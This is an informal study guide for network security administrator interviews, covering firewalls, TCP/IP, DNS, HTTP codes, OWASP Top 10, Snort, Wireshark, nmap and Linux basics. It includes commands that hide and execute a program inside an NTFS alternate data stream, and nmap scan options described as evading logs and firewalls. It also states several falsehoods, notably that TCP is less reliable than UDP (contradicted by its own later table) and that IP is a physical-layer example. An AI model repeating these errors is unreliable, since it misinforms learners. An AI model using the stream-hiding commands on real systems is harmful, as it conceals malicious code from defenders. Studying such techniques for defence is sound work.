
# Network Security Administrator

## Study Guide

### V: 3.0

---

## Table of Conducts


1. [General Theory](#General-Theory)

2. [Network](#Network)

3. [HTTP](#HTTP)

4. [OSI Model](#OSI-Model)

5. [OWASP Top 10](#OWASP-To-10)

6. [Tools](#Tools)

7. [Linux](#Linux)

8. [Windows](#Windows)

9. [Scripting](#Scripting)

10. [Random & Trick Questions](#Random-/-Trick-Questions)

11. [Web Attacks](#Web-Attacks)


---

## 1. General Theory

#### Syslog: Message Logging Standard

Separates:

1. Software that generate them
2. system that stores them
3. software that reports/analyzes

Severity levels:


  * Emergency
  * Alert

* Critical
* Error
* Warning
* Notice
* Info
* Debug

---

### Alternate Data Streams (ADS)

ADS is the ability to fork file data into existing files without affecting their functionality, size, or display to traditional file browsing utilities like dir or Windows Explorer.


####	A feature of NTFS:

* Introduced to support Macintosh Hierarchical File System
* User can hide files that can go undetected

#### Q: What is it, how has it been abused?

* Answer: A way to take an existing file, and execute different code

These commands are used in conjunction with a redirect [>] and colon [:] to fork one file into another.

Examples:

* \> type notepad.exe>test.txt:note.exe
* \> .\test.txt:note.exe
* This will run notepad.exe and it will be displayed as note.exe

Detecting it:

* Anti-malware programs
* \> lads C:\

---

### Hash vs. Cryptography vs. Compression vs. Encoding

### Hash:

- One way function
- arbitrary size data:
	* same length signature each time
	* completely random
	* snowball effect changes
	* almost exclusively unique checksums
	* verify integrity

#### Cryptography: Securing data, using certs or passwords

*Compression*

- reducing data size
- can use math principles
- find like strings
- assign character to string type

*Encoding*

- changing bases
- taking ascii to base64

#### Crypto and compression:

Which first?

*Compress then encrypt*

1. Compress first.
2. Once you encrypt the file you will generate a stream of random data, which will be not be compressible.
3. The compression process depends on finding compressible patterns in the data.

#####	Types of Cryptography

Symmetric

* Both parties use the same symmetric key to encrypt and decrypt
* AES
* DES

Asymmetric

* Private and Public Key
* Person encrypt with private key and lets everyone decrypt it with public key
* Person encrypts with public key and sends to the owner of private key
* RSA

---

### Firewalls

Stateless vs. Stateful and why it matters

#### Stateless

* Watch network traffic
* Restrict or block packets based on source and destination addresses / ports
* Not aware of traffic pattern / Not aware of data flows
* Uses simple rule sets, not account for possibility of package pretending to be someone you ask for

#### Stateful | Dynamic Package Filtering

* Watch traffic streams from end to end
* Aware of communication paths, can implement IPsec tunnels/encryption
* Can recognize if TCP connection is open, open sent, sync, sync ack, or establish
* It will deny unsolicited packets but permit if session is initiated from protected network

#### Differences

Stateless    | Stateful
--- | ---
faster                 |		slower
heavy traffic 		     | identify unauthorized access
don't see all handshake |	see all handshake


#### Why it matters

* Stateful is more secure, always use it.
* Unless in the risk model says otherwise. Look at companies needs.

#### Ingress filter

* Filters connections comming in

#### Egress filter

* Filters connections going out
* Ex. Web server will never establish connections out.

#### Proxy Firewall

* works with port redirection
* Checks each package for coherence
* Ex. Packages dont follow http standar on http port
* Man in the middle of the packages comming in, before they get to the destination

##### Web Application Firewalls (Also called a WAF, EX. Modsecurity)

* They use regular expressions

###### What is the "shun" command? (Related to firewalls)

- To block connections from an attacking host, use the shun command in privileged EXEC mode.
- To disable a shun, use the no form of this command.

-example:

shun source_ip [dest_ip source_port dest_port [protocol]] [vlan vlan_id]

no shun source_ip [vlan vlan_id]
---

#### Incident Response

- check logs /var/logs/apache2
- look for connections
- netstat scan to enumerate connections
- investigate suspicious connections - - interrogation
- compare IPS against logs
	- /bash rcs
	- cronjobs
	- look at listening ports
	- if they have a port open they can netcat in

####	6 Step Incident Handling:

1. Preparation
2. Identification
3. Containment
4. Eradication
5. Recovery
6. Lessons Learned

	Incident Analysis --> looking at it

	Incident Handling --> responding, policies etc.

---

#### Load Balancing

* Distributes workload across multiple computers/networks/disks/CPUs
* Maximize throughput
* Minimize response time
* Avoid overload of single resource

##### Load Balancing vs Channel Bonding

	* LB divides traffic between network interfaces. Up to Layer 4 (OSI)
	* CB divides traffic between physical interfaces. Only Layer 1-2 (OSI)

* Memcached = have a pool of shared resources.
	* In case server 1 goes down, the user can still use server 2 and not lose info without him even noticing.

* Read more at Antihackers Tool Kit.

---

#### RPC (Remote Procedure Call)

remote procedure call is client/server system in which a computer program causes a subroutine or procedure to execute in another address space (commonly on another computer on a shared network) without the programmer explicitly coding the details for this remote interaction.

**Problems?**

*	Miconfiguration - can get a lot of info if misconfigured

enum4linux - rpc client, smb client

---

#### SNMP (Simple Network Management Protocal)

- good for finding information, public/private strings, can brute force the strings

**Problems?**

* misconfiguration
* Monitoring all devices

---

#### Network Info Gathering
Commands

- whois -
- host
- nbtstat - records for internal host etc
- netbios names to ip addresses

---

#### Difference between malware vs virus vs worms

* Malware - malicious software
* virus - self replicates, spreads, ftp shares etc,
* worm - also self replicates

---

#### Virtual Private Networks (VPN)

* Connects computers over different networks securely
* Client-Server connection
* Creates tunnel between client to server
* Encrypted data, even if MITMA it wont understand anything
* If someone get in the middle, tunnel recreates through other route of routers

---

###	Encrypted Proxy
Usually uses UDP

---

#### LDAP (know this one)

* Lightweight Directory Access Protocol
* Domain credentials
* Maintaining distributed directory information services over an Internet Protocol network

---

#### IPSec

* Internet Protocol Security
* protocol to secure IP by authenticating and encrypting each package
* provides mutual authentication at beginning of session
* end to end security scheme that works in the IP Layer not application layer like (TLS, SSH).

#### Architecture


* (Authentication) Authentication header is conectionless and protects agains replay attack
* (Confidentiality | Auth | Integrity) by using ESP, Encapsulating Securty Payloads
* Sec. Assos. provide algos and data for AH and ESP

---

#### AH - Authentication Header Structure

			* Next Header (8-bits)
				* type of next header
			* Payload Length (8-bits)
				* lenght of this header
			* Reserved (16-bits)
				* Not implemented yet
			* Security Params Index (32-bits)
				* Arbitrary value with destination IP, used like a Nonce
			* Sequence Number (32-bits)
				* increasing seq. num. increments by 1 for every package sent (prevent replay attack)
			* Integrity Check Value (multiple of 32-bits)
				* variable check value, may have padding for IPv4/6

	---

#### ESP - Encapsulating Security Payloads Structure

	* Security Parameters Index
		* Arbitrary value with destination IP, used like a Nonce
	* Sequence Number
		* increasing seq. num. increments by 1 for every package sent (prevent replay attack)
	* Payload Data
		* protect content of original IP package (may contain an IV)
	* Padding
		* used for encryption
	* Padding Lenght
		* size of padding in octects
	* Next Header
		* type of next header
	* Integrity Check Value
		* variable check value, may have padding for IPv4/6

* Transport Mode
	* only payload of IP package is encrypted/authenticated

* Tunnel Mode
	* Entire package is encrypted/authenticated, then encapsulated in new IP package

---

#### IRC and how it has been used for malware

-	cnc
-	can be tell-tale sign
-	port 6667

---
#### Botnets

* Be able to talk about them
* obsucation:  obscuring of the intended meaning of communication by making the message difficult to understand
* DDOS

---

#### SCADA
Supervisory control and data acquisition (SCADA) is a control system architecture comprising computers, networked data communications and graphical user interfaces (GUI) for high-level process supervisory management, while also comprising other peripheral devices like programmable logic controllers (PLC) and discrete proportional-integral-derivative (PID) controllers to interface with process

---

#### System Information Event Mgmt (SIEM)

* Security Information and Event Management
* Provides real time analysis of sec. alerts generated by network applications

* Reporting
	* PCI
		* Payment Card Industry
	* HIPAA
		* Health Insurance Portability and Accountability Act
	* SOAX
		* Sarbanes-Oxley Act
* Event Management
	* Real time monitoring
	* Incident Management
	* Response
	* Alerting
* Log Analysis
	* Automated
	* User Driven

---
#### Defense in depth model

* Its goal is to defend a system against attacks using independent methods
* Originally a military strategy to delay/prevent attacks

Layers

* Perimeter
* Network
* Host
* Application
* Data
* Physical

---

#### Certificates and Digital Signing

* Certificates
* Created with OpenSSL
* A Certification Authority manages and certifies other certificates
* Certificate should be signed by CA
* Contains
	* Serial Number
	* Subject
	* Signature Algorithm
	* Signature
	* Issuer
	* Valid From
	* Valid To
	* Key Usage
	* Public Key
	* Thumprint Algorithm
	* Thumbprint

#### Digital Signature

* Verify the sender to assure Authentication and Non-Repudiation
* Used in soft distribution, financial transactions, detect forgery, detect tampering
* Uses RSA

* Private | Public key is selected
* SIGN(M1)_Private -> S
* VERIFY(S, M1)_Public -> M1

---

#### Vulnerability Scanning

##### Operating Systems

* OpenVAS
* Nessus

##### Web Applications

* Grabber
* Vega

##### Databases

* SQLMap

---

#### IDS vs. IPS

* IDS analyzes the header and payload of package and if rule matches a log message is generated
* IPS same as IDS but may **reject the package**

Example of IPS in action

* Delete attachment of malicious email
* Patch router after an attempt of an attack

Analogy

* Firewall = Doorman:
 		* person who allow or deny people access
		*	Allow or Reject packages based on IP address and port

* IDS = Person who searches for guns, knifes, etc
	* But if found any only calls police or alarms other authority
	* Logs the package, sends a pop up

* IPS = Searches the person but if found a gun... then kicks the person out
	* Runs a program, patches something, writes a new rule, deletes attachments

#### Q:Is Snort an IDS or IPS, or both?

	* A: IDS but can leverage it to act like IPS using inline mode

---
---

## 2. Network:

---

### CIDR Notation (Must know)

how you represent an ip address range with / notation
/24 - 24 bit offset
/23 = 2^9
bit masking


* Classless Inter-Domain Routing
* Method to allocate IP address and routing IP packets

* 192.168.1.0/32	 == 192.168.1.0	  ->  192.168.1.0
* 192.168.1.0/24 	 == 192.168.1.0 	->  192.168.1.255
* 192.168.0.0/16 	 == 192.168.0.0		->  192.168.255.255
* 192.0.0.0/8    	 == 192.0.0.0 		->  192.255.255.255
* 0.0.0.0/0   	 	 == 0.0.0.0   		->  255.255.255.255

---

### TCP (Transmission Control Protocol)

TCP Flags and Meaning

- SYN = Synchronization
	* 1st step to establish connection
	* only the first packet should have this flag set (from both hosts)

- ACK = Acknowledgement
	* acknowledge the packets that successfully received by the host
	* flag is set if the number in the field is valid
		-> the receiver would send ACK=1, SYN=1

- FIN = Finish
	* used to request for a connection termination (when there is no more data)
	* last package sent by the sender, connection ends

- RST = Reset
	* terminates the connection if the RST sender feels like there is something wrong with the TCP connection or the connection should not exist
	* send from receiver side when packet is sent to particular host that was not expecting it

- PSH = Push
 * when transport layer  sets PSH is set = 1 and immediately sends the sedment to network layer as soon as it receives signal by the application layer


* Google and read (Ex. SYN, ACK, FIN, RST, PUSH)
	Client makes initial req
	Starts with TCP packet (SYN)
	if server doesn't want to connect RST (reset/forceful disconnect), or FIN (disconnect)
		half-duplex connect
	SYN-ACK
	tcpdump = period is ack
	What is the one flag that is set in all packets, except for initial request - Ack
		push ack "p."

---

####	TCP Connection Process

* Complements the IP protocol
* Transmit octects
* Not as reliable as User Datagram Protocol
* Structure
	* Source port (16-bits)
	* destination port (16-bits)
	* Sequence num (32-bits)
		* if SYN = 0 then seq. num is the accumulated seq num of 1st data byte for this session
		* if SYN = 1 then seq. num is the initial seq num. Ack num is this + 1
	* Acknole number (32-bits)
		* If ACK set then this = next seq number
	* Data Offset (4-bits)
		* size of the TCP header in words -- *
			* min size is 5, max size is 15
			* min size is 20 bytes, max is 60 bytes
	* Reserved (3-bits)
		* always 0

##### Flags (9-bits)

* NS = ECN-nonce concealment protection
* CWR = Congestion Window Reduced
	* indicates if it received a segment
* ECE = ECN-Echo
	* if SYN = 1 then TCP peer is ECN capable
	* if SYN = 0 then Congestion experienced flag is received during normal transition
* URG = Urgent pointer is significant
* ACK = Acknowled field is significant
* PSH = ask to push the buffered data to the receiving app
* RST = reset connection
* SYN = Synchronize seq number, only first packet from each end should have this set.
* FIN = no more data to end

* Window size (16-bits)
		* window size of units the sender is willing to receive

* Checksum (16-bits)
		* 16-bit checksum of header and data for error checking

* Urgent Pointer (16-bit)
		* if URG set then offset of sequence number

* Options (0-320 bits, divisible by 32)
		* length determined by data offset field
	* Option Kind 1 byte
			* only field not optional, specified type of options
	* Option Lenght 1 byte
			* total lenght of option
	* Option Data varies bytes[]

---

#### Handshake

##### 3 step handshake to establish a connection

* Three way handshake
1. SYN = client send SYN to server
	* sets random number A for seq#
2. SYN-ACK = response from server
	* ack number is A+1
	* seq num is random numb B again
3. ACK = sent by client has
	* ack number of A+1
	* seq num is B+1

--

##### 3 steps to kill a connection (gracefully)

1. FIN ->
2. ACK-FIN <-
3. ACK ->

---

#### TCB
Transmission Control Block

* Contains important information about the connection
	* Two sockets number that identify it
	* IP port pair

---

#### UDP Protocol
User Datagram Protocol

* No handshake
* No guarantee of delivery, ordering or duplicate protection.
* Used when error checking is not necessary
* Used in transaction oriented
	* DNS or NTP(network time protocol)
	* Apps with no retransmission delays like Voice Over IP / Online Games
* Uses datagram sockets (IP address + port)
* Structure
	* Source Port (16-bits)
		* Port of sender
	* Destination Port (16-bits)
		* Port of client
	* Length (16-bits)
		* specifies bytes of UDP header (min 8-bytes) and data. max 65535 bytes
	* Checksum (16-bits)
		* Error checking for header and data

- Connectionless protocol
- Some services only take in packets, never respond

---

### Ports

|  Port  |     Service     |
-------- | :----------------
| 20 | FTP (data transfer) |
| 21 | FTP (control) |
| 22  |	SSH, SCP, SFTP |
| 23 | Telnet |
| 25 | SMTP |
| 53 | DNS |
| 67,8 | DHCP (Dynamic Host Configuration Protocol)|
| 80 | HTTP |
| 88 | Kerberos |
| 110 | POP3 |
| 111 | RPC (Remote Procedure Protocol) |
| 123 | Network Time Protocol |
| 389 | LDAP |
| 443 | HTTPS |
| 445 | SMB |
| 543 | Kerberos login |
| 544 | Kerberos Shell |
| 3306 | mySQL default |
| 3389 | RDP |

---

#### Port Forwarding and Redirection

* Forward the package going to one port to another port.
* Web Server running in port 8080, client connects through port 80

* Forward to a port first to analyze packages then once it is done it does to the original target port

* As a hacker, it can protect the hacker by giving anonymity
* Attacker forwards its attack from another port, request comes back and never knows who really was

* Open redirection* occurs when a vulnerable web page is redirected to an untrusted and malicious page that may compromise the user.  Open redirection attacks usually come with a phishing attack because the modified vulnerable link is identical to the original site, which increases the likelihood of success for the phishing attack.

* Read more in Antihacker Tool Kit (SSH Forwarding)

---

### Web Technologies and Attack Methods:

* SQL Injection
* CSRF - Cross Site Request Forgery
	- cPanel - high priority
	- [owasp](#OWASP-To-10)
* XSS - blogs
* XSE - Cross Site
	- xml injection
	- or sql injection over xml
* LFI -  Local File Include
* RFI - Remote File Include(contingent on php.ini)
* RCE (Remote Command Execution)

---

### DNS (Domain Name System)

* naming system for computers/services/resources connected to the internet/private network
* translate domain names into IP addresses

##### CNAME
Canonical Name

* Alias for another domain name
* Always pointing to another domain name not ip address

##### FQDN
Fully Quallified Donamin Name

* Complete domain name for specific computer/host in the internet
* Consists of host followed by domain name followed by TLD
* mymail.	somesite	.com
* www.		somesite	.com

##### TLD
Top Level Domain

Categorized by
* Country Code
* Generic
* Sponsored
* Infrastructure

---

Know the different [record types](#https://en.wikipedia.org/wiki/List_of_DNS_record_types)
- not all of them
* More important: A, MX, CN, etc

* A Record 				| Address Record
	* The entry associated with the ip address and the domain name
* AAAA Record 			| IPv6 Address Record
	* The entry associated with the ip address and the domain name
* APL Record 			| Address Prefix
	* List of addresses ranges for various address families
* CAA Record 			| Cert. Authority Authorization
* CNAME Record 			| Canonical Name
	* Alias to another domain
* DHCID Record 			| DHCP Identifier
* DNAME Record 			| Delegation Name
	* Alias for a name and all sub names
* IPSECKEY Record 		| IPsec Key
	* Key used for IPsex
* KEY Record
* KX Record 			| Key Exchange
	* Used with crypto systems to identify key management agent for the domain name
* LOC Record 			| Location
	* Associates geo location to domain name
* MX Record 			| Mail Exchange
	* maps domain name to their list of message transfer agents
* NS Record 			| Name Server
	* Delegates a DNS Zone
* RP Record 			| Responsible Person
	* Info about the reponsible person of the domain
* SOA Record 			| Start Of Authority
	* Authoritative information about DNS zone, including
		* name servers
		* email of domain admin
		* serial number of domain
* SRV Record 			| Service Locator
	* Used for newer protocols instead of creating protocol specifix records
* TKEY Record 			| Secret Key
	* Method to provide key material to be used when encryptig
* TSIG Record 			| Transaction Signature
	* Authenticate dynamic updates comming from client
* TXT Record 			| Text
	* Has machine readable data.
	* Arbitrary unformatted text, usually contains information about server, network, data center

* How it works
* DNS server (in same network) mantain a small database of domain names and ip addresses
* DNS Server Database delegate name resolution to other DNS servers on internet


#### DNS Transfer

- ip adress can have multiple dns addresses to it.
-	returns a list of domains and subdomains of certain IP
- attack surface greatly increases

host command on nameserver

---

#### DHCP

* Know what it is and it stands for Dynamic Host Configuration Protocol
* assigns ip addresses to your subnet

---

### *TTL* (Must Know)
**Time to live aka hop limit**

* Limits the lifespan of data in network. May be as a counter, or timestamp
* Used to prevent packages to circulate for infinite amounts of time
* After it dies the ICMP sends a datagram error code of 11 - Time Exceeded

Finger print operating systems

* Every OS has a different TTL and different Window Size on their TCP packages
	* Linux = 64
	* Windows = 128
	* iOS = 255
	* Solaris = 255

- Used for traceroute
	* Every time a router gets the package it decreases the TTL by 1
	* traceroute sends packages starting with TTL = 1 and increasing by 1 in each package
	* Every time the TTL gets to 0 the router send a ICMP error code of 11 - Time Exceeded


Can be spoofed, so not reliable.

---

##### TCP vs. UDP

* TCP is connection oriented and UDP is connectionless
* UDP uses datagrams
* What are some services that use UDP
* What are some services that use TCP

-- | --
TCP is reliable				|	UDP is not reliable
TCP is ordered				|	UDP is not ordered
TCP is heavyweight			|	UDP is lightweight
TCP uses byte stream			|	UDP uses datagram (sent individually)
TCP handles congestions		|	UDP does not handle congestion
TCP establishes connections	|	UDP broadcast messages

---

#### Network Address Translation (NAT)

* methodology of remapping one IP address space into another
* client sends package to public ip address then gets translated to private ip addresses
* Uses NAT Forwarding Table to translate private to public ip addresses

---

#### TOR

* A mesh of tor proxy servers
* Provides annonimity throught tor relays
* Every request goes through multiple tor relays until it reaches the destination
* Tor relays do not know the full path, only where the previous and next relay are
* All communications encrypted, except from last relay to destination

---

#### ICMP Protocol

* Internet Control Message Protocol
* One of main protocols in IP used by network devices (routers)
* Not used to transfer data
* Used for control and diags

* Structure
	* Type (8-bits)
		* ICMP type (0=ping)
	* Code (8-bits)
		* ICMP subtype
	* Checksum (16-bits)
		* For error checking
	* Rest of Header (32-bits)
		* Varies depending on type and code

* Codes
	* 0  - Echo Reply
	* 3  - Destination Unreachable
	* 8  - Echo
	* 11 - Time exceded

---

## 3. HTTP

### HTML Protocol and Response Codes
HyperText Transfer Protocol

* Request Response protocol
* Client send an HTTP request message to server
* Server responds with HTML file and other content

##### Methods or "verbs"

* GET 		-> Read only
* HEAD 		-> Read only
* POST 		-> Usually to make transaction/changes inside the server
* PUT 		-> Usually to make transaction/changes inside the server
* DELETE 	-> Usually to make transaction/changes inside the server
* TRACE 	-> Read only
* OPTIONS 	-> Read only
* CONNECT
* PATCH 	-> Usually to make transaction/changes inside the server

### Response Status Codes
*Know the different sections*

#### 1XX

* 1XX - Information
* 100 - continue
* 101 - switching protocols
* 102 - processing
* 2XX - success


#### 2XX
This class of status codes indicates the action requested by the client was received, understood, accepted and processed successfully.

* 200 - OK
* 201 - Created
* 202 - Accepted
* 203 - Non-Authoritative
* 204 - No Content
* 205 - Reset Content
* 206 - Partial Content
* 207 - Multi Status
* 208 - Already Reported
* 226 - IM Used

####  3XX - Redirection
This class of status code indicates the client must take additional action to complete the request. Many of these status codes are used in URL redirection.

* 300 - Multiple Choices
* 301 - Moved Permanently
* 302 - Found
* 303 - See Other
* 304 - Not Modified
* 305 - Use Proxy
* 306 - Switch Proxy
* 307 - Temporary Redirect
* 308 - Permanent Redirect

##### 4XX - Client Error
The 4xx class of status code is intended for cases in which the client seems to have erred. Except when responding to a HEAD request, the server should include an entity containing an explanation of the error situation, and whether it is a temporary or permanent condition. These status codes are applicable to any request method. User agents should display any included entity to the user.


* 400 - Bad Request
* 401 - Unauthorized
* 402 - Payment Required
* 403 - Forbidden
* 404 - Not Found
* 444 - No Response

##### 5XX - Server Error
Response status codes beginning with the digit "5" indicate cases in which the server is aware that it has encountered an error or is otherwise incapable of performing the request. Except when responding to a HEAD request, the server should include an entity containing an explanation of the error situation, and indicate whether it is a temporary or permanent condition. These response codes are applicable to any request method.

* 500 - Internal Server Error
* 501 - Not Implemented
* 502 - Bad Gateway
* 503 - Service Unavailable
* 504 - Gateway Timeout
* 505 - HTTP Version Not Supported
* 506 - Variant Also Negotiates
* 507 - Insufficient Storage
* 508 - Loop Detected
* 509 - Bandwith Limit Exceeded
* 510 - Not Extended
* 511 - Network Authentication Required
* 598 - Network Read Timeout
* 599 - Network Connect Timeout

### *KNOW THESE CODES FOR SURE*:

- 200 OK

- 403 Forbidden

- 404 Not Found

- 500  Internal Server Error

- 302  Found

- 416 -> related to successful ms15_034
				- is DDOS
				if vulnerable, either no response or 416

				- Range Not Satiable (RFC 7233)
			The client has asked for a portion of the file (byte serving), but the server cannot supply that portion. For example, if the client asked for a part of the file that lies beyond the end of the file. Called "Requested Range Not Satiable" previously

---

#### HTML Headers

* Delimited by the head tag
* Contains Doctype
* Metadata
	* Description
	* Keywords
	* Author
* Title
* Links to css/js files

* Host: specifies the Internet host and port number of the resource being requested domain you are requesting
* User agent:
* Content:
* *X-forwarded-for: "xff" 	- important*
* True Client IP
	- contains the ip address of originating requester
	- can be spoofed
	- xrealip
	- [more](#http://www.soc.napier.ac.uk/~bill/sql.pdf)


#### *X Forwarded For*
True Client IP  <-- Impressive if known
burp suite, google headers

---

## 4.) OSI Model
Open System Interconnection Model

### Layers

#### Physical - Layer 1

* Hardware side of the communication
* sending and receiving data on a carrier
* involves cables, cards.
* Examples: IP

---

#### Data Link - Layer 2

* Data packages are encoded and decoded into bits
* Divided into two sub layers
	* MAC - Media Access Control
		* how the computer gains access in the network to the data
	* LLC - Logical Link Control
		* controls frame sync, flow control, error checking
* Examples: ATM, IEEE, PPP

---

#### Network - Layer 3

* Provides switching and routing technology.
* Transmit the data from node to node
* Routing and forwarding
* addressing, internetworking, error handling, congestion control and packet sequencing
* Examples: IP

---

#### Transport - Layer 4

* transparent transfer of data between systems or hosts
* data transfer
* Examples: TCP, UDP

---

#### Session - Layer 5

* Establishes, manages, terminates connections between applications
* NetBios, RPC, SQL

---

#### Presentation - Layer 6

* data representation by translating from application to network format
* encrypts the data
* also called syntax layer
	* Examples: ASCII, GIF, JPEG

---

#### Application - Layer 7

* Application end user processes
* user authentication and privacy are considered
* application services for file transfer, email, network software, telnet, ftp.
* Examples: WWW browsers, HTTP, FTP, SNMP

---
---

## 5. OWASP Top 10

### A1 – Injection:

- Injection flaws, such as SQL, OS, and LDAP injection occur when untrusted data is sent to an interpreter as part of a command or query.

- The attacker’s hostile data can trick the interpreter into executing unintended commands or accessing data without proper authorization.

### A2 – Broken Authentication and Session Management:

- Application functions related to authentication and session management are often not implemented correctly, allowing attackers to compromise passwords, keys, or session tokens, or to exploit other implementation flaws to assume other users’ identities.

### A3 – Cross-Site Scripting (XSS):

- XSS flaws occur whenever an application takes untrusted data and sends it to a web browser without proper validation or escaping.

- XSS allows attackers to execute scripts in the victim’s browser which can hijack user sessions, deface web sites, or redirect the user to malicious sites.

###	A4 – Insecure Direct Object References:

- A direct object reference occurs when a developer exposes a reference to an internal implementation object, such as a file, directory, or database key.

- Without an access control check or other protection, attackers can manipulate these references to access unauthorized data.

### A5 – Security Misconfiguration:

- Good security requires having a secure configuration defined and deployed for the application, frameworks, application server, web server, database server, and platform. Secure settings should be defined, implemented, and maintained, as defaults are often insecure. Additionally, software should be kept up to date.

### A6 – Sensitive Data Exposure:

- Many web applications do not properly protect sensitive data, such as credit cards, tax IDs, and authentication credentials.

- Attackers may steal or modify such weakly protected data to conduct credit card fraud, identity theft, or other crimes.

- Sensitive data deserves extra protection such as encryption at rest or in transit, as well as special precautions when exchanged with the brows.

### A7 – Missing Function Level Access Control:

- Most web applications verify function level access rights before making that functionality visible in the UI.

- However, applications need to perform the same access control checks on the server when each function is accessed.

- If requests are not verified, attackers will be able to forge requests in order to access functionality without proper authorization.

### A8 - Cross-Site Request Forgery (CSRF):

- A CSRF attack forces a logged-on victim’s browser to send a forged HTTP request, including the victim’s session cookie and any other automatically included authentication information, to a vulnerable web application.

- This allows the attacker to force the victim’s browser to generate requests the vulnerable application thinks are legitimate requests from the victim.

### A9 - Using Components with Known Vulnerabilities:

- Components, such as libraries, frameworks, and other software modules, almost always run with full privileges.

- If a vulnerable component is exploited, such an attack can facilitate serious data loss or server takeover.

- Applications using components with known vulnerabilities may undermine application defenses and enable a range of possible attacks and impacts.

### A10 – Unvalidated Redirects and Forwards:

- Web applications frequently redirect and forward users to other pages and websites, and use untrusted data to determine the destination pages.

- Without proper validation, attackers can redirect victims to phishing or malware sites, or use forwards to access unauthorized pages.

---
---

## 6. Tools

---

### Snort
IDS - Intrusion Detection System

#### Types of Rules

* Pass Rules:
	- same as alert, only opposite, allows traffic to pass. Useful for false positives. allows to be noted

	- Home net = known ip addresses

* Alert Rules:
	- most common, if traffic matches, it activates alert/event. sql injection, malware activity, cnc, exploit.

	- content team writes, to detect new cve

* Suppression rule:
		- suppresses alert rule or pass rule, can give it ip addresses, can set iprange variable.

#### Event filters

* Gen3 Rules, why might this not be good?
	- binary  - compiled rule
		- because it's compiled, you can't see the signature rule
* Signatures
* Snort.conf
	everything defined

* Stream5 and Pre procs
	streams - allow monitoring flow of traffic
		stream 5 - flow
		http inspect - http_header - different sections of packet

---

#### Capabilities

* IDS and IPS
* Real time package analysis
* Package logging
* Protocol Analyzis
* Content searching/matching
* Detect OS fingerprint
* Detect buffer overflows
* Detect Stealth port scans

* Packer Logger Mode : Logs packages into external disk

* Sniffer Mode : Read network packages and display them in console

* IDS Mode : Program monitors the packages and performs actions based on defined rules

#### Rules
Composed by rule header and rule options

##### Rule Header
Contains rule actions, protocol, source IP, destination IP, netmasks, source port, dest port

##### Rule Options
Contains alert msg and info which parts of packet should be inspected if rule action is taken

##### Actions

- | - | - | - | - | - | -
Alert | Log | Pass | Activate | Dynamic | Drop | Reject | Sdrop
---

##### Active Rules
Logs something then trigers another rule

##### Dynamic Rules
Triggered by active rule

Examples

* alert tcp any any -> 192.168.1.0/24 111 \
	(content:"|00 01 86 a5|"; msg:"mountd access";)

*Given a Snort Rule, be able to explain it*

Format:

action protocol src_ip src_port direction dst_ip dst_port (options)


---

#### Tcpdump

* know flags
	- "-i" specifies the interface
	- "-w" file to save output
	- -n wont try to resolve domain/ip (can take long) will just list the domain.
	- -nn adds verbosity, lists port numbers as opposed to services
* use "man" to learn more about it, this is one of the most used tools here so know how it works and play with it.

-c for count, -c 10 stops after ten packets

tcpdump -i any -c 10 -n

##	Q: can you use tcpdump to find payload data?
A: yes

- tcdump uses byte offsets, can use that to calculate where payload data starts.
- ngrep makes it much easier

---

### Wireshark

* Know how to create a BPF in it (Berkely Packet Filter, easy)
theres an option in the settings portion, where you can define BPF, which is a standard for how you wanna speficfy ip, maybe a port, or everything but ip, or exclde subnet

Format:

host <ipaddr> <srcprt> <destport>

* How to follow a tcp stream

* wireshark filters (Both types of filters)

#### Display Filters

* tcp.port eq 25
* ip.srcc == 192.168.0.0/16
* tcp.flags.reset != 1
* udp[8:3] == 00:06:5B    -> Skip first 8 bytes then next three have to match
* eth.addr contains 81:60:03

#### Capture Filters

* host 192.168.0.1     -> Capture only from or to that IP address
* net 192.168.0.0/24   -> Capture from or to that IP
* src net IP           -> Capture from
* dst net IP           -> Capture to
* port 53              -> Capture only DNS
* port not 80          -> Capture all but port number
* tcp 1501-1549        -> capture port range

---

### Nmap scanning
Network Scanning Tool

#### SCANS
Only one type of scanning at a time (Excpet UDP scan -sU and one SCTP scan -sY -sZ)

* -sS 				-> 	 TCP SYN scan
	* Performs fast.
	* Sends SYN packages but doesnt finish connection.

* -sT 				-> 	 TCP connect scan
	* When SYN is not an option. User not have raw packet priviledges

* -sU 				-> 	 UDP scan
	* If return message is unreachable then is offline. Otherwise, it is up.

* -sY 				-> 	 SCTP INIT scan
	* Just like SYN, never opens a conection, send INIT then receives INIT-ACK

* -sN; -sF; -sX 	-> 	 TCP NULL, FIN, and Xmas scans
	* Sends only FIN or no flags set. Results are like -sS scan but this doesnt show on logs.

* -sW 				-> 	 TCP Window scan

* -sM 				-> 	 TCP Maimon Scan
	* BSD systems drop FIN-ACK if open, send RST if closed

* -sZ 				-> 	 SCTP COOKIE ECHO scan
	* if open, silently drop SCTP ECHO packages, sends ABORT if closed.
	* Marked by Stateful

* -sI 				-> 	 Idle scan
	* Uses a zombie host. Send SYN/ACK to zombie, records ID from RST from zombie.
	* Forges zombies SYN and send to target. Send SYN/ACK to zombie, check if ID from RST is 2++.

* -sO 				-> 	 IP Protocol scan
	* Send raw IP package with no protocol header to each protocol on target machine

* -sP 				-> 	 Ping scan
	* sends ICMP ECHO REQUEST (ping) if something is received back then it is alive.

* -sV 				->   Version Scan
	* Collect info and version of service

* -sA 				-> 	 ACK scan
	* Distinguish between stateless and stateful firewalls

* -b  				-> 	 FTP Bounce scan
	* Scan ports through a ftp connection

* -F
	* Fragmented package
	* Bypass most stateless firewalls

---

### Tshark - network capture tool, can do layer 3 stuff

---

### hping

	 hping is a command-line oriented TCP/IP packet assembler/analyzer

---

### tripwire

---
---

## 7. Linux

### Shadow vs. Passwd

#### Shadow
stores hashes


#### Passwd
shows which users have passwords
- "!"
* Know difference
* Where are they located
	/etc

---

###	How to hide a file in linux
put a period infront of it to hide it
* "ls" command to list files, use "-a" and you can see the hidden files

---

### Linux File System Locations

##### Location of user password hashes
/etc/shadow

##### Location of user accounts
/etc/passwd

##### Location of sudo users
/etc/sudoers

##### Location of common log files
/var/log

---

## 	Questions:

5 (at a min) Linux Security Features:
	- User roles
	- Passwords
	- ASLR - address randomization - can disable
	- DEP data execution prevention
	- Memory Protection

---

###	Basic Linux Commands

###	Q: How to list all open files? What can this tell you?
ls of open ports all info about processess connections use with grep to find shit quickly

###	How to Monitor a file for changes?
A: tail -f <filename>
- defaults to last 10 lines of file, can watch active files come in.

Preferred A: watch

### Q: How to find a file

- find /root/ <filename>
- locate <filename>


###	Linux Commands

- lsof 		= List open files
- netstat	= Watch network traffic
	- netstat -a -g
- watch 	= Watch network traffic
- top 		= list process
- ls 		= list files
- id 		= current user
- w 		= list logged in users
- who -a	= list user information
- cat 		= view contents of a file without opening it
- etc, Look over the commands in the RTFM
- Man command
